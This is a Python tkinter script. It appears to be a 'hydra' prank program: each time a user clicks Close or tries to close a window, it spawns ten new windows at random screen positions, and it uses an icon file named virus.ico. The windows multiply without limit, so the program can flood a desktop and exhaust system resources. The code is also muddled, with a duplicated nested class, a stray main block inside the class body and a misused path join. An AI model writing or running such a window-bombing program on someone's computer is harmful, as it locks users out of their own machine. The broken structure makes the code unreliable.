import tkinter as tk
import random
import os


class Application(tk.Frame):
    window_count = 1

    def __init__(self, master=None):
        super().__init__(master)
        self.master = master
        self.pack()
        self.create_widgets()

    class Application(tk.Frame):
        def __init__(self, master=None):
            super().__init__(master)
            self.master = master
            self.master.title("My Application")
            self.create_widgets()

        def create_widgets(self):
            # Create a label to display the logo
            logo_path = r'C:\Users\WINDOWS 10\PycharmProjects\Scripts\logo.png'
            logo_image = tk.PhotoImage(file=logo_path)
            logo_label = tk.Label(self, image=logo_image)
            logo_label.pack()

            # Create other widgets as needed

    if __name__ == "__main__":
        root = tk.Tk()
        app = Application(master=root)



    def create_widgets(self):
        # Set the window icon
        icon_path = os.path.join(os.path.dirname(__file__), r'C:\Users\WINDOWS 10\PycharmProjects\Scripts\virus.ico')  # replace 'icon.ico' with your icon file name
        self.master.iconbitmap(default=icon_path)
        # Create the button that closes the window
        self.close_button = tk.Button(self, text="Close", command=self.close_window)
        self.close_button.pack(side="bottom")

        # Create the label that displays the window number
        self.window_label = tk.Label(self, text="Window " + str(Application.window_count))
        self.window_label.pack()

        # Set the window position randomly
        x = random.randint(0, self.master.winfo_screenwidth() - self.master.winfo_reqwidth())
        y = random.randint(0, self.master.winfo_screenheight() - self.master.winfo_reqheight())
        self.master.geometry("+{}+{}".format(x, y))

    def close_window(self):
        # Destroy the current window
        self.master.destroy()

        # Create 10 new windows
        for i in range(10):
            root = tk.Tk()
            app = Application(master=root)
            app.master.protocol("WM_DELETE_WINDOW", app.close_window)

        # Update the window count for the next window
        Application.window_count += 1


class ApplicationManager:
    def __init__(self, num_windows):
        self.num_windows = num_windows
        self.windows = []

        # Create the windows
        for i in range(num_windows):
            root = tk.Tk()
            app = Application(master=root)
            app.master.protocol("WM_DELETE_WINDOW", app.close_window)
            self.windows.append(app)

        # Start the main loop of the GUI for the last window
        self.windows[-1].master.mainloop()

    @staticmethod
    def run(num_windows):
        app_manager = ApplicationManager(num_windows)

ApplicationManager.run(2)
